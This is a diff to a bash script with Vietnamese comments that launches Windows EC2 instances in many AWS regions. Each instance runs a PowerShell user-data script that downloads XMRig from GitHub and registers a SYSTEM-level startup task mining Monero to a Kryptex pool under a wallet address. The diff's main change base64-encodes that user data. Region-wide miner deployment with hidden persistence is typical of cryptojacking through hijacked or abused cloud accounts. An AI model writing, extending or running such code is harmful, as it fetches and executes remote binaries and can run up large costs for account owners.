@@ -30,7 +30,7 @@ create_keypair() {
 # Tạo file user_data để khởi động XMRig trên Windows instance
 cat << 'EOF' > user_data_script.ps1
 powershell -NoProfile -ExecutionPolicy Bypass -Command "& {
-    $workDir = 'C:\\XMRig';
+    $workDir = 'C:\XMRig';
     if (-Not (Test-Path $workDir)) {
         New-Item -ItemType Directory -Path $workDir | Out-Null
     }
@@ -38,8 +38,8 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command "& {
 
     # Đường dẫn tải xuống XMRig
     $xmrigUrl = 'https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-gcc-win64.zip'
-    $xmrigZip = "$workDir\\xmrig-6.22.2.zip"
-    $xmrigDir = "$workDir\\xmrig-6.22.2-gcc"
+    $xmrigZip = "$workDir\xmrig-6.22.2.zip"
+    $xmrigDir = "$workDir\xmrig-6.22.2-gcc"
 
     # Tải xuống XMRig
     if (-Not (Test-Path $xmrigZip)) {
@@ -53,7 +53,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command "& {
 
     # Thêm vào Task Scheduler để chạy khi hệ thống khởi động
     $taskName = 'StartXMRig'
-    $taskAction = New-ScheduledTaskAction -Execute "$xmrigDir\\xmrig.exe" -Argument "-o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYZ.myworker -k --coin monero -a rx/0"
+    $taskAction = New-ScheduledTaskAction -Execute "$xmrigDir\xmrig.exe" -Argument "-o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV.myworker -k --coin monero -a rx/64"
     $taskTrigger = New-ScheduledTaskTrigger -AtStartup
     $taskPrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
     $taskSettings = New-ScheduledTaskSettingsSet
@@ -62,6 +62,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command "& {
 }"
 EOF
 
+# Mã hóa user_data thành Base64
 user_data_base64=$(base64 -w 0 user_data_script.ps1)
 
 # Khởi tạo các phiên bản EC2...
@@ -112,7 +113,7 @@ for region in "${!region_image_map[@]}"; do
     fi
     echo "Sử dụng Subnet ID $subnet_id trong $region"
 
-    # Khởi chạy instance
+    # Khởi chạy instance với user-data Base64
     instance_id=$(aws ec2 run-instances \
         --image-id "$image_id" \
         --count 1 \
@@ -120,7 +121,7 @@ for region in "${!region_image_map[@]}"; do
         --key-name "$key_name" \
         --security-group-ids "$sg_id" \
         --subnet-id "$subnet_id" \
-        --user-data "file://user_data_script.ps1" \
+        --user-data "$user_data_base64" \
         --region "$region" \
         --query "Instances[0].InstanceId" \
         --output text)
